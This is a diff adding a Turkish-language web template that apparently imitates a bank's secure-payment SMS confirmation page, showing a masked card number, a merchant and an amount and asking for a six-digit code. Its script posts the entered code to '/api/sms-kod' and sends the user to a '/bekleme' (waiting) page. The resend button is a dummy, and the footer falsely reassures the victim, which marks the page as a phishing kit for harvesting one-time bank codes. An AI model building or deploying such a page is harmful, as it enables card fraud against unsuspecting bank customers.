@@ -1,0 +1,243 @@
+﻿<html lang="tr"><head>
+	<title>GO - GÜVENLİ ÖDEME</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; minimum-scale=1.0; user-scalable=no; target-densityDpi=device-dpi">
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<link rel="stylesheet" href="/is/css/style.min.css?1.0.2.0">
+</head>
+<body>
+	<%
+	  var simdi = new Date();
+	  var ikiBasamak = function (n) { return String(n).padStart(2, '0'); };
+	  var tarihMetni = ikiBasamak(simdi.getDate()) + '.' + ikiBasamak(simdi.getMonth() + 1) + '.' + simdi.getFullYear() + ' ' + ikiBasamak(simdi.getHours()) + ':' + ikiBasamak(simdi.getMinutes());
+	  var telefonRaw = String((kullanici && kullanici.telefon) || '').replace(/\D/g, '');
+	  var telGoster = '05XXXXXXXXX';
+	  if (/^(05\d{9}|\+905\d{9}|905\d{9})$/.test(telefonRaw)) {
+	    telGoster = telefonRaw.slice(0, 2) + '******' + telefonRaw.slice(-2);
+	  }
+	  var kartNoSon4Goster = String((kullanici && kullanici.kartNoSon4) || '').replace(/\D/g, '') || '****';
+	  var islemAdiGoster = (typeof islemAdi !== 'undefined' && islemAdi) ? String(islemAdi) : 'HOSTINGDUNYAM';
+	  var tutarGoster = (typeof tutar !== 'undefined' && tutar) ? String(tutar) : '1,00 TL';
+	%>
+
+	<table style="width: 100%; vertical-align: middle; text-align: center; font-size: 14px; color: white; background-color:#747474;display:none;" id="warningTop">
+		<tbody><tr>
+			<td style="text-align: center; vertical-align: middle; padding:  10px; color: white; font-family: Tahoma;">Kullandığınız internet tarayıcısının versiyonu bu sayfanın doğru çalışmasına engel olabilir. Bir sorunla karşılaşırsanız lütfen internet tarayıcınızın sürüm güncellemesini gerçekleştirip tekrar deneyiniz.</td>
+		</tr>
+	</tbody></table>
+	<!-- End Browser Check -->
+
+<div class="container-banner ">
+    <div class="container-fluid-banner">
+        
+            <img src="/is/images/banner.jpg" style="width: 100%">
+      
+    </div>
+</div>
+</a>
+
+<div class="container-fluid header  Maximum V">
+    <div class="container">
+            <div class="col-xs-6 header-left"></div>
+            <div class="col-xs-6 header-right"></div>
+    </div>
+</div>
+<div class="container-fluid cardno">
+    <div class="container">
+                <h1><span class="title">KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span class="lastDigits"><%= kartNoSon4Goster %></span></h1>
+    </div>
+</div>
+<div class="container-fluid details">
+    <div class="container">
+        <div class="col-xs-12">
+            <div class="col-xs-12 col-sm-4 merchant">
+                <span><%= islemAdiGoster %></span>
+            </div>
+            <div class="col-xs-6 col-sm-4 amount">
+                <span><%= tutarGoster %></span>
+            </div>
+            <div class="col-xs-6 col-sm-4 date">
+                 <span><%= tarihMetni %></span>
+            </div>
+        </div>
+    </div>
+</div>
+	<div class="container-fluid content">
+		
+
+
+
+<div class="container">
+    <input type="hidden" id="trxId" value="0012ed3852c0-fd78-4ec3-aca1-6cc731fc3eee">
+    <div class="col-xs-12">
+        <div class="col-xs-12 info">
+                            <p class="smallScreenText"><%= telGoster %> numaralı telefonunuza gönderilen mobil onay kodunu girerek işleminizi onaylayabilirsiniz.</p>
+                            <p class="largeScreenText"><%= telGoster %> numaralı telefonunuza gönderilen mobil onay kodunu girerek işleminizi onaylayabilirsiniz.</p>
+
+        </div>
+        <div class="col-xs-12 formHolder">
+
+            <input id="otpText" type="text" inputmode="numeric" autocomplete="one-time-code" pattern="[0-9]*" maxlength="6" placeholder="Doğrulama Kodu">
+            <div id="smsHataMesaji" style="display:none; color:#d21a1a; font-size:12px; font-weight:700; margin:8px 0 0; text-align:left;"></div>
+            <input id="approveButton" type="button" value="Onayla" class="primary">
+            <input id="reSendButton" type="button" value="Kodu Tekrar Gönder" class="primary reSend">
+
+        </div>
+    </div>
+    <div class="col-xs-12 countdown" style="margin-top: 12px;">
+        <div id="progressBar" style="position: relative; width: 100%; height: 10px; border-radius: 10px; background: #d9d9d9; overflow: hidden; box-shadow: inset 0 0 0 1px rgba(0,0,0,0.05);">
+            <div id="countdownProgress" style="height: 100%; width: 100%; background: linear-gradient(90deg, #cfcfcf 0%, #cfcfcf 100%); border-radius: 10px; transition: width 1s linear, background 0.8s ease; display: block;"></div>
+        </div>
+        <div id="countdownText" style="font-size: 11px; color: #666; text-align: right; margin-top: 5px; font-weight: 700;">180</div>
+    </div>
+    <div class="progressBarClear">
+        &nbsp;
+    </div>
+</div>
+
+	</div>
+	<div class="container-fluid footer">
+		<div class="container">
+			<p>KART BİLGİLERİNİZ İŞYERİ İLE <strong><u>KESİNLİKLE PAYLAŞILMAMAKTADIR</u></strong>.</p>
+		</div>
+	</div>
+
+
+
+
+<script>
+(function () {
+  var input = document.getElementById('otpText');
+  var btn = document.getElementById('approveButton');
+  var hataMesaji = document.getElementById('smsHataMesaji');
+  var reSendButton = document.getElementById('reSendButton');
+  var hataliSms = <%- JSON.stringify(!!hataliSms) %>;
+  var resendEnabled = false;
+
+  function setResendState(enabled) {
+    if (!reSendButton) return;
+    reSendButton.disabled = !enabled;
+    reSendButton.style.opacity = enabled ? '1' : '0.5';
+    reSendButton.style.cursor = enabled ? 'pointer' : 'not-allowed';
+  }
+
+  function gosterHata(mesaj) {
+    if (!hataMesaji) return;
+    hataMesaji.textContent = mesaj || 'Hatalı SMS girdiniz. Lütfen tekrar deneyin.';
+    hataMesaji.style.display = 'block';
+  }
+
+  function gizleHata() {
+    if (!hataMesaji) return;
+    hataMesaji.textContent = '';
+    hataMesaji.style.display = 'none';
+  }
+
+  if (hataliSms && hataMesaji) {
+    gosterHata('Hatalı SMS girdiniz. Lütfen tekrar deneyin.');
+  }
+
+  var params = new URLSearchParams(window.location.search);
+  if (params.get('hatali') === '1' && hataMesaji) {
+    gosterHata('Hatalı SMS girdiniz. Lütfen tekrar deneyin.');
+  }
+
+  if (input) {
+    input.addEventListener('input', function () {
+      input.value = input.value.replace(/\D/g, '').slice(0, 6);
+      gizleHata();
+      if (btn) {
+        btn.disabled = input.value.length !== 6;
+      }
+    });
+  }
+
+  if (btn) {
+    btn.addEventListener('click', function () {
+      var kod = (input ? input.value : '').replace(/\D/g, '');
+      if (!/^\d{6}$/.test(kod)) {
+        gosterHata('Geçerli bir 6 haneli SMS kodu giriniz.');
+        return;
+      }
+
+      gizleHata();
+      btn.disabled = true;
+
+      fetch('/api/sms-kod', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ kod: kod })
+      })
+        .then(function (response) { return response.json(); })
+        .then(function (data) {
+          if (!(data && data.ok)) {
+            btn.disabled = false;
+            gosterHata((data && data.hata) || 'SMS kodu kaydedilemedi.');
+            return;
+          }
+          window.location.href = '/bekleme';
+        })
+        .catch(function () {
+          btn.disabled = false;
+          gosterHata('Sunucuya bağlanılamadı. Lütfen tekrar deneyin.');
+        });
+    });
+  }
+
+  if (reSendButton) {
+    setResendState(false);
+    reSendButton.addEventListener('click', function () {
+      if (!resendEnabled) return;
+      if (hataMesaji) hataMesaji.style.display = 'none';
+      if (input) input.value = '';
+      if (btn) btn.disabled = true;
+    });
+  }
+})();
+</script>
+
+<script>
+(function () {
+  var total = 180;
+  var remaining = total;
+  var progress = document.getElementById('countdownProgress');
+  var text = document.getElementById('countdownText');
+  var resendBtn = document.getElementById('reSendButton');
+  if (!progress || !text) return;
+
+  function updateCountdown() {
+    var ratio = Math.max(0, remaining / total);
+    var percent = ratio * 100;
+    progress.style.width = percent + '%';
+
+    if (remaining > 20) {
+      var orangeMix = 1 - (remaining - 20) / (total - 20);
+      var orange = Math.round(207 + orangeMix * 40);
+      var red = Math.round(207 + orangeMix * 20);
+      progress.style.background = 'linear-gradient(90deg, #d4d4d4 0%, rgb(' + orange + ', ' + (orange - 26) + ', ' + red + ') 100%)';
+    } else {
+      progress.style.background = 'linear-gradient(90deg, #d4d4d4 0%, #d91b1b 100%)';
+    }
+
+    if (resendBtn) {
+      resendBtn.disabled = remaining > 0;
+      resendBtn.style.opacity = remaining > 0 ? '0.5' : '1';
+      resendBtn.style.cursor = remaining > 0 ? 'not-allowed' : 'pointer';
+    }
+
+    text.textContent = remaining;
+  }
+
+  updateCountdown();
+  var timer = setInterval(function () {
+    remaining = Math.max(0, remaining - 1);
+    if (remaining <= 0) {
+      clearInterval(timer);
+    }
+    updateCountdown();
+  }, 1000);
+})();
+</script>
+</body></html>
